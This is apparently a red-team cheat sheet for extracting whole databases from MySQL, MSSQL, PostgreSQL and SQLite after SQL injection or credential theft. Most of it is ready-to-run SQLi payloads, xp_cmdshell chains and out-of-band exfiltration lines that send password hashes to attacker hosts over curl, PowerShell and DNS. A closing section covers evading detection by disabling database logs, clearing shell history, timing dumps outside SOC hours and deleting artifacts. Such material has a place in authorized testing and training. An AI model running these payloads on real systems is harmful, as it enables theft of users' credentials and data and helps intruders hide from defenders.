# Database Dumping Techniques

Comprehensive database extraction methodology for authorized penetration tests. Covers full-database extraction across MySQL, MSSQL, PostgreSQL, SQLite, and OOB exfiltration paths. Use after achieving SQL injection or database credentials.

**Scope:** Authorized engagements, CTF, red-team. Always confirm written authorization before extracting real data.

---

## 1. MySQL / MariaDB Extraction

### 1.1 mysqldump (Credential Access)

When you have OS-level or direct DB access with credentials:

```bash
# Full dump
mysqldump -u root -p'Password123' --all-databases > /tmp/all.sql

# Single database
mysqldump -u root -p'Password123' targetdb > /tmp/targetdb.sql

# Single table
mysqldump -u root -p'Password123' targetdb users > /tmp/users.sql

# No-create-info (data only, faster transfer)
mysqldump -u root -p'Password123' --no-create-info targetdb users > /tmp/users_data.sql

# Compress on the fly
mysqldump -u root -p'Password123' targetdb | gzip > /tmp/targetdb.sql.gz

# Remote dump (confirm firewall allows 3306)
mysqldump -h 10.10.10.5 -u root -p'Password123' targetdb > /tmp/remote.sql
```

### 1.2 SELECT INTO OUTFILE (SQL Injection / FILE Privilege)

Requires `FILE` privilege and `secure_file_priv` set to empty or the target path.

```sql
-- Check privilege
SELECT @@secure_file_priv;
SHOW GRANTS FOR CURRENT_USER();

-- Dump table to file
SELECT * FROM users INTO OUTFILE '/var/www/html/dump.txt' FIELDS TERMINATED BY ',' LINES TERMINATED BY '\n';

-- Read via web if web root is writable
-- curl http://target.com/dump.txt

-- Hex-encoded to bypass basic filters
SELECT 0x2F7661722F7777772F68746D6C2F64756D702E747874;
SELECT * FROM users INTO OUTFILE '/var/www/html/dump.txt';
```

**Troubleshooting:**
- `ERROR 1290`: `secure_file_priv` is set to a specific dir — write there instead
- `ERROR 1045`: No FILE privilege — need UNION/error injection path instead
- File already exists → pick a new filename (MySQL won't overwrite)

### 1.3 UNION-Based Batch Dump via SQLi

Column count discovery first:

```sql
-- Order-by method
ORDER BY 1-- -
ORDER BY 2-- -
... until error → that number - 1 = column count

-- UNION NULL method
UNION SELECT NULL-- -
UNION SELECT NULL,NULL-- -
... until no error

-- Dump database list
UNION SELECT schema_name,2,3 FROM information_schema.schemata-- -

-- Dump tables
UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema='targetdb'-- -

-- Dump columns
UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'-- -

-- Dump data (concat to fit one column)
UNION SELECT concat(username,0x3a,password),2,3 FROM users-- -

-- Dump all rows with LIMIT/OFFSET (pagination)
UNION SELECT concat(username,0x3a,password),2,3 FROM users LIMIT 100 OFFSET 0-- -
UNION SELECT concat(username,0x3a,password),2,3 FROM users LIMIT 100 OFFSET 100-- -
```

### 1.4 Blind Boolean Extraction (character by character)

```sql
-- Check first char of password for admin
AND substring((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -
AND ascii(substring((SELECT password FROM users WHERE username='admin'),1,1))>97-- -

-- Binary search: much faster
AND ascii(substring((SELECT password FROM users WHERE username='admin'),1,1))>64-- -
AND ascii(substring((SELECT password FROM users WHERE username='admin'),1,1))>96-- -
```

### 1.5 MySQL OOB via DNS (Blind, no response needed)

```sql
-- Requires FILE privilege and outbound DNS
SELECT load_file(concat('\\\\',version(),'.attacker.burpcollaborator.net\\share'));
SELECT load_file(concat(0x5c5c5c5c,(SELECT password FROM users LIMIT 1),0x2e61747461636b65722e636f6d5c5c7368617265));
```

---

## 2. MSSQL Extraction

### 2.1 bcp Utility (Bulk Copy Program)

Available when you have OS shell (via xp_cmdshell or RCE):

```cmd
-- Export table to file
bcp "SELECT * FROM targetdb.dbo.users" queryout C:\Users\Public\users.csv -S localhost -T -c

-- With credentials
bcp "SELECT * FROM targetdb.dbo.users" queryout C:\Users\Public\users.csv -S localhost -U sa -P Password123 -c

-- Import back (for pivoting data between servers)
bcp targetdb.dbo.users in C:\Users\Public\users.csv -S localhost -T -c

-- Compress and exfil via PowerShell after bcp
Compress-Archive -Path C:\Users\Public\users.csv -DestinationPath C:\Users\Public\users.zip
```

### 2.2 xp_cmdshell + sqlcmd Chain

```sql
-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Run sqlcmd to dump to file
EXEC xp_cmdshell 'sqlcmd -S localhost -Q "SELECT * FROM targetdb.dbo.users" -o C:\Users\Public\dump.txt';

-- Exfil via certutil (base64 encode first)
EXEC xp_cmdshell 'certutil -encode C:\Users\Public\dump.txt C:\Users\Public\dump.b64';

-- PowerShell upload to attacker
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://10.10.14.5:8000/upload -Method POST -InFile C:\Users\Public\dump.txt"';
```

### 2.3 Linked Server Exfiltration

When the target MSSQL has a linked server configured:

```sql
-- List linked servers
EXEC sp_linkedservers;
SELECT name, data_source FROM sys.servers WHERE is_linked = 1;

-- Query via linked server (four-part naming)
SELECT * FROM [linkedserver].[targetdb].[dbo].[users];

-- OpenQuery syntax
SELECT * FROM OPENQUERY([linkedserver], 'SELECT username, password_hash FROM users');

-- Use to pivot to otherwise unreachable DBs
```

### 2.4 MSSQL Error-Based Dump (via SQLi, no blind)

```sql
-- Enumerate databases
SELECT name FROM master..sysdatabases-- -

-- Tables in a DB
SELECT name FROM targetdb..sysobjects WHERE xtype='U'-- -

-- Convert trick for data extraction in error message
AND 1=convert(int,(SELECT TOP 1 username+':'+password_hash FROM targetdb..users))-- -

-- String concat for multiple fields
AND 1=convert(int,(SELECT TOP 1 username+0x3a+password_hash FROM targetdb..users WHERE username NOT IN (SELECT TOP 0 username FROM targetdb..users)))-- -
```

---

## 3. PostgreSQL Extraction

### 3.1 COPY TO (File Write, Requires superuser)

```sql
-- Check superuser
SELECT current_user, pg_catalog.current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = current_user;

-- Dump table to CSV
COPY users TO '/tmp/users.csv' DELIMITER ',' CSV HEADER;

-- Dump query result
COPY (SELECT username,password_hash FROM users) TO '/tmp/creds.csv' CSV;

-- Write to web root (if accessible)
COPY users TO '/var/www/html/dump.csv' CSV;
```

### 3.2 pg_read_file / pg_ls_dir (superuser only)

```sql
-- List directory contents
SELECT pg_ls_dir('/etc');
SELECT pg_ls_dir('/var/lib/postgresql/data');

-- Read arbitrary file
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/var/lib/postgresql/data/pg_hba.conf');

-- Read binary file (returns hex)
SELECT pg_read_binary_file('/etc/shadow');
```

### 3.3 PostgreSQL via SQLi (UNION)

```sql
-- Enumerate databases
UNION SELECT datname,2,3 FROM pg_database-- -

-- Tables in current DB
UNION SELECT tablename,2,3 FROM pg_tables WHERE schemaname='public'-- -

-- Columns
UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'-- -

-- Data extraction
UNION SELECT username||':'||password_hash,2,3 FROM users-- -
```

### 3.4 PostgreSQL OOB via COPY (requires NETWORK EGRESS)

```sql
-- Copy to remote server via PROGRAM (requires superuser)
COPY (SELECT username,password_hash FROM users) TO PROGRAM 'curl -X POST http://10.10.14.5:8000/ -d @-';

-- DNS-based OOB
COPY (SELECT version()) TO PROGRAM 'nslookup $(psql -t -c "select version()" | head -1 | tr " " "_").attacker.com';
```

---

## 4. SQLite Extraction

### 4.1 .dump Command (Direct Access)

```bash
# Full schema + data dump
sqlite3 /path/to/database.db .dump > /tmp/dump.sql

# Just data (no schema)
sqlite3 /path/to/database.db ".mode csv" ".output /tmp/users.csv" "SELECT * FROM users;" ".quit"

# Interactive dump
sqlite3 /path/to/database.db
.tables
.schema users
SELECT * FROM users;
.output /tmp/out.txt
.dump
.quit
```

### 4.2 Raw File Copy

SQLite databases are single files — copy the file directly:

```bash
# Local copy
cp /var/www/app/database.sqlite /tmp/stolen.db

# Via LFI if the app exposes it
curl http://target.com/../../database.sqlite -o local.db
sqlite3 local.db .dump

# Via path traversal in file download endpoints
curl "http://target.com/download?file=../../../database.sqlite" -o local.db
```

### 4.3 SQLite via SQLi

```sql
-- Enumerate tables (SQLite-specific)
UNION SELECT name,2 FROM sqlite_master WHERE type='table'-- -

-- Dump schema
UNION SELECT sql,2 FROM sqlite_master WHERE type='table' AND name='users'-- -

-- Extract data
UNION SELECT username||':'||password,2 FROM users-- -
```

---

## 5. Out-of-Band (OOB) Exfiltration

### 5.1 DNS Exfiltration

Ideal when response content is not returned (blind injection, WAF blocking output):

```sql
-- MySQL
SELECT load_file(concat('\\\\', (SELECT hex(password) FROM users LIMIT 1), '.attacker.burpcollaborator.net\\a'));

-- MSSQL (requires xp_dirtree or DNS resolution)
EXEC master..xp_dirtree concat('\\\\', (SELECT TOP 1 password_hash FROM users), '.attacker.com\\a');
DECLARE @q varchar(1024); SET @q='\\'+substring((SELECT password_hash FROM users WHERE id=1),1,30)+'.attacker.com\a'; EXEC master..xp_dirtree @q;

-- PostgreSQL (via COPY TO PROGRAM)
COPY (SELECT encode(password_hash::bytea,'hex') FROM users LIMIT 1) TO PROGRAM 'bash -c "nslookup $(cat).attacker.com"';
```

### 5.2 HTTP Callback Exfiltration

```sql
-- MySQL (requires FILE privilege + curl on host)
SELECT * FROM users INTO OUTFILE '/tmp/d.txt';
-- then via xp_cmdshell or OS shell: curl -d @/tmp/d.txt http://attacker.com:8000/

-- MSSQL via xp_cmdshell
EXEC xp_cmdshell 'for /f "tokens=*" %a in (''sqlcmd -Q "SELECT TOP 1 password_hash FROM users" -h-1 -W'') do curl -s http://10.10.14.5:8000/?data=%a';

-- PostgreSQL via COPY TO PROGRAM
COPY (SELECT password_hash FROM users LIMIT 1) TO PROGRAM 'curl -X POST http://10.10.14.5:8000/ -d @-';
```

### 5.3 Chunking Large Data

DNS labels are limited to 63 characters; split large payloads:

```sql
-- MySQL: chunk hex-encoded data
SELECT load_file(concat('\\\\', substring(hex((SELECT password FROM users LIMIT 1)),1,40), '.attacker.com\\a'));
SELECT load_file(concat('\\\\', substring(hex((SELECT password FROM users LIMIT 1)),41,40), '.attacker.com\\a'));

-- Automate chunking: use sqlmap's --dns-domain flag
sqlmap -u "http://target.com/page?id=1" --dns-domain=attacker.burpcollaborator.net --dump -T users
```

---

## 6. Tool-Assisted Dumping

### 6.1 sqlmap

```bash
# Full DB dump
sqlmap -u "http://target.com/page?id=1" --dump-all --batch

# Target specific DB and table
sqlmap -u "http://target.com/page?id=1" -D targetdb -T users --dump --batch

# With cookie auth
sqlmap -u "http://target.com/profile" --cookie="PHPSESSID=abc123" -D app -T users --dump

# POST data
sqlmap -u "http://target.com/login" --data="username=admin&password=test" -p username --dump

# OOB DNS dump
sqlmap -u "http://target.com/page?id=1" --dns-domain=<burp-collaborator-host> --dump -T users

# Level/risk for aggressive detection
sqlmap -u "http://target.com/page?id=1" --level=5 --risk=3 --dump

# Tamper scripts for WAF bypass
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between --dump
```

### 6.2 ghauri (Modern sqlmap Alternative)

```bash
# Basic dump
ghauri -u "http://target.com/page?id=1" --dump --dbs

# Error-based technique
ghauri -u "http://target.com/page?id=1" --technique=E --dump -D targetdb -T users

# Time-based blind
ghauri -u "http://target.com/page?id=1" --technique=T --dump -D targetdb -T users
```

### 6.3 Impacket for MSSQL

```bash
# Connect and query
python3 mssqlclient.py sa:'Password123'@10.10.10.5

# In interactive shell:
SQL> SELECT * FROM targetdb.dbo.users;
SQL> EXEC xp_cmdshell 'whoami';

# Enable xp_cmdshell
SQL> enable_xp_cmdshell

# Dump via bcp
SQL> xp_cmdshell bcp "SELECT * FROM targetdb.dbo.users" queryout C:\Users\Public\out.csv -S localhost -T -c
```

---

## 7. OPSEC: Detection Avoidance

### 7.1 Rate Limiting and Chunking

- **Never dump entire databases in one burst.** Large sequential queries trigger anomaly detection.
- Use LIMIT/OFFSET with delays between requests:
  ```
  sqlmap --delay=2 --safe-freq=5 --safe-url=http://target.com/
  ```
- Chunk data extraction: 100 rows per request, pause 5s between chunks.
- Avoid running between 09:00–17:00 target timezone (SOC active hours).

### 7.2 Avoid Known Signatures

- Use UNION-based or error-based over time-based (less log noise, faster).
- Avoid `information_schema` on MariaDB (triggers WAF rules on some setups) — use `mysql.innodb_table_stats` instead:
  ```sql
  SELECT database_name, table_name FROM mysql.innodb_table_stats;
  ```
- Hex-encode string literals to bypass keyword filters:
  ```sql
  SELECT * FROM users WHERE id=1 UNION SELECT 0x61646d696e,2-- -
  -- instead of UNION SELECT 'admin',2
  ```

### 7.3 Log Evasion (Post-Exploitation with Shell)

```bash
# MySQL: disable general log temporarily (requires SUPER)
SET GLOBAL general_log = 'OFF';
-- [do your dump]
SET GLOBAL general_log = 'ON';

# Clear bash history after using mysql CLI
unset HISTFILE; mysql -u root -p'Password123' -e "SELECT * FROM users;" targetdb > /tmp/d.txt
```

### 7.4 File Cleanup

Always remove exfil artifacts from the target after confirming receipt:

```bash
rm /tmp/dump.sql /tmp/users.csv
-- or via xp_cmdshell: del C:\Users\Public\dump.txt
```

---

## 8. Decision Tree

```
Have credentials?
├── YES → mysqldump / bcp / pg_dump / sqlite3 .dump (fastest, most complete)
└── NO → SQLi only?
    ├── UNION response visible → UNION-based batch dump
    ├── Error messages visible → Error-based extraction
    ├── Blind (boolean only) → Boolean binary search (slow, use sqlmap)
    └── Blind + OOB allowed → DNS/HTTP callback exfiltration (fastest blind)
```

---

## 9. References

- sqlmap documentation: https://sqlmap.org
- ghauri: https://github.com/r0oth3x49/ghauri
- impacket mssqlclient: https://github.com/fortra/impacket
- OWASP Testing Guide — SQL Injection: https://owasp.org/www-project-web-security-testing-guide/
- PayloadsAllTheThings SQL Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
